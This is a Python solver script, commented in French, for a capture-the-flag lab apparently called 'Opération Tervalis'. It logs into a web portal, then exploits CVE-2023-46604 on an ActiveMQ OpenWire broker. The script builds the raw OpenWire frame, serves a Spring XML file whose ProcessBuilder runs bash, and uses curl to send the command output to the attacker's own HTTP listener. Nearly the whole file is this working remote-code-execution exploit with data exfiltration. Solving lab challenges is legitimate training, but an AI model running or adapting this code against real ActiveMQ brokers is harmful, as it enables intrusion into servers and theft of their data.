#!/usr/bin/env python3
"""
HackerLab 2026 - Opération Tervalis

Chaîne :
  1. Authentification sur le portail FBI Valdoria (/api/login).
  2. Le portail expose un relais interne ActiveMQ (champ "relay" de /api/status).
  3. Le broker OpenWire 61616 est joignable directement et vulnérable à
     CVE-2023-46604 (ActiveMQ 5.18.2, désérialisation non sûre dans
     BaseDataStreamMarshaller -> ClassPathXmlApplicationContext).
  4. Le XML Spring servi par l'attaquant instancie un java.lang.ProcessBuilder
     qui exfiltre la sortie via curl vers notre serveur HTTP local.
  5. Lecture du fichier de flag présent dans le conteneur du relais.

Usage :
    python3 solve.py --base http://172.28.9.3:8080
    python3 solve.py --base http://172.28.9.3:8080 --user analyste --password '...'
    python3 solve.py --base http://172.28.9.3:8080 --lhost 10.135.226.180

Aucune dépendance externe : bibliothèque standard uniquement.
"""

from __future__ import annotations

import argparse
import html
import http.cookiejar
import http.server
import json
import re
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.request
from urllib.parse import urlparse

FLAG_RE = re.compile(r"HLB2026\{[^}\r\n]{1,200}\}")

DEFAULT_USER = "analyste"
DEFAULT_PASSWORD = "EXPURGE"

# Fichier de flag observé dans le conteneur du relais + recherche de secours.
FLAG_COMMAND = (
    "cat /opt/activemq/data/flag.txt 2>/dev/null; "
    "find / -xdev -maxdepth 5 -type f -iname '*flag*' 2>/dev/null "
    "-exec cat {} \\; 2>/dev/null"
)


def log(msg: str) -> None:
    print(f"[*] {msg}", flush=True)


def ok(msg: str) -> None:
    print(f"[+] {msg}", flush=True)


def err(msg: str) -> None:
    print(f"[-] {msg}", file=sys.stderr, flush=True)


# ---------------------------------------------------------------------------
# Portail HTTP (session persistante via cookie jar)
# ---------------------------------------------------------------------------

class Portal:
    def __init__(self, base: str, timeout: float) -> None:
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def _request(self, path: str, payload: dict | None = None) -> tuple[int, dict]:
        url = self.base + path
        data = None
        headers = {"Accept": "application/json"}
        if payload is not None:
            data = json.dumps(payload).encode()
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers)
        try:
            with self.opener.open(req, timeout=self.timeout) as resp:
                body = resp.read().decode("utf-8", "replace")
                return resp.status, _maybe_json(body)
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", "replace")
            return exc.code, _maybe_json(body)

    def status(self) -> dict:
        code, body = self._request("/api/status")
        if code != 200:
            raise RuntimeError(f"/api/status -> HTTP {code}: {body}")
        return body

    def login(self, user: str, password: str) -> None:
        code, body = self._request(
            "/api/login", {"username": user, "password": password}
        )
        if code != 200 or not body.get("ok"):
            raise RuntimeError(f"authentification refusée (HTTP {code}): {body}")
        ok("authentification réussie")


def _maybe_json(text: str) -> dict:
    try:
        parsed = json.loads(text)
        return parsed if isinstance(parsed, dict) else {"data": parsed}
    except json.JSONDecodeError:
        return {"raw": text}


# ---------------------------------------------------------------------------
# Serveur HTTP d'attaque : sert le XML Spring et reçoit l'exfiltration
# ---------------------------------------------------------------------------

class ExploitServer(http.server.ThreadingHTTPServer):
    daemon_threads = True

    def __init__(self, address, handler_cls, xml_payload: bytes):
        super().__init__(address, handler_cls)
        self.xml_payload = xml_payload
        self.exfil: bytes | None = None
        self.fetched = threading.Event()
        self.received = threading.Event()


class ExploitHandler(http.server.BaseHTTPRequestHandler):
    server: ExploitServer

    def do_GET(self) -> None:  # noqa: N802
        if self.path.startswith("/poc.xml"):
            self.server.fetched.set()
            body = self.server.xml_payload
            self.send_response(200)
            self.send_header("Content-Type", "application/xml")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("Content-Length", "0") or 0)
        data = self.rfile.read(length) if length else b""
        self.server.exfil = data
        self.server.received.set()
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, *_args) -> None:  # silence
        pass


def build_spring_xml(command: str) -> bytes:
    xml = (
        '<beans xmlns="http://www.springframework.org/schema/beans" '
        'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
        'xsi:schemaLocation="http://www.springframework.org/schema/beans '
        'http://www.springframework.org/schema/beans/spring-beans.xsd">'
        '<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">'
        "<constructor-arg><list><value>bash</value><value>-c</value>"
        f"<value>{html.escape(command)}</value></list></constructor-arg>"
        "</bean></beans>"
    )
    return xml.encode()


def openwire_payload(url: str) -> bytes:
    """Trame OpenWire CVE-2023-46604 (ExceptionResponse + classe Spring)."""
    cls = "org.springframework.context.support.ClassPathXmlApplicationContext"

    def pack(value: str) -> bytes:
        raw = value.encode()
        return len(raw).to_bytes(2, "big") + raw

    body = (
        bytes.fromhex("1f00000000000000000001")
        + b"\x01"
        + pack(cls)
        + b"\x01"
        + pack(url)
    )
    return len(body).to_bytes(4, "big") + body


def local_ip_for(host: str, port: int) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect((host, port))
        return sock.getsockname()[0]


def exploit(
    host: str,
    port: int,
    lhost: str,
    lport: int,
    command: str,
    wait: float,
) -> bytes:
    exfil_cmd = (
        f'curl -s -m 15 --data-binary "$({command})" '
        f"http://{lhost}:{lport}/exfil || true"
    )
    xml = build_spring_xml(exfil_cmd)

    server = ExploitServer(("0.0.0.0", lport), ExploitHandler, xml)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    log(f"serveur d'exploitation sur 0.0.0.0:{lport} (callback {lhost})")

    url = f"http://{lhost}:{lport}/poc.xml"
    packet = openwire_payload(url)
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            sock.sendall(packet)
        ok(f"charge OpenWire envoyée à {host}:{port}")
    finally:
        # On laisse le serveur vivre le temps de l'exfiltration.
        pass

    if not server.fetched.wait(wait):
        err("le relais n'a pas récupéré le XML Spring (exploit non déclenché)")
        server.shutdown()
        raise RuntimeError("aucune requête /poc.xml reçue")

    ok("le relais a chargé le XML Spring (ProcessBuilder exécuté)")
    if not server.received.wait(wait):
        err("aucune exfiltration reçue (commande exécutée mais sortie perdue)")
        server.shutdown()
        raise RuntimeError("aucune exfiltration reçue")

    data = server.exfil or b""
    server.shutdown()
    return data


# ---------------------------------------------------------------------------
# Programme principal
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="Solver Opération Tervalis (portail -> relais ActiveMQ -> RCE)"
    )
    parser.add_argument("--base", default="http://172.28.9.3:8080",
                        help="URL du portail (défaut: %(default)s)")
    parser.add_argument("--user", default=DEFAULT_USER)
    parser.add_argument("--password", default=DEFAULT_PASSWORD)
    parser.add_argument("--broker-port", type=int, default=61616)
    parser.add_argument("--lport", type=int, default=8001)
    parser.add_argument("--lhost", default=None,
                        help="IP de callback (défaut: IP locale vers la cible)")
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--wait", type=float, default=45.0,
                        help="attente max du callback (défaut: %(default)s)")
    args = parser.parse_args()

    target = urlparse(args.base)
    if not target.hostname:
        err(f"URL de base invalide: {args.base}")
        return 2
    host = target.hostname

    log(f"portail cible: {args.base}")
    portal = Portal(args.base, args.timeout)

    try:
        before = portal.status()
        log(f"état initial: relay={before.get('relay')} "
            f"authenticated={before.get('authenticated')}")

        portal.login(args.user, args.password)
        after = portal.status()
        if not after.get("authenticated"):
            raise RuntimeError("session non authentifiée après login")
        ok(f"connecté en tant que {after.get('user')!r}")
        if not after.get("relay"):
            err("le portail ne signale aucun relais actif")
            return 3

        try:
            with socket.create_connection((host, args.broker_port), timeout=5):
                pass
            ok(f"relais OpenWire accessible sur {host}:{args.broker_port}")
        except OSError as exc:
            err(f"port {args.broker_port} injoignable: {exc}")
            return 4

        lhost = args.lhost or local_ip_for(host, args.broker_port)
        log(f"IP de callback: {lhost}")

        output = exploit(host, args.broker_port, lhost, args.lport,
                         FLAG_COMMAND, args.wait)
    except KeyboardInterrupt:
        err("interrompu")
        return 130
    except Exception as exc:  # noqa: BLE001 - solveur autonome
        err(str(exc))
        return 1

    text = output.decode("utf-8", "replace")
    print("\n--- sortie du relais ---")
    print(text)
    print("--- fin de sortie ---\n")

    match = FLAG_RE.search(text)
    if not match:
        err("aucun flag EXPURGE trouvé dans la sortie")
        return 5

    print(f"FLAG: {match.group(0)}")
    ok("résolution terminée")
    return 0


if __name__ == "__main__":
    sys.exit(main())
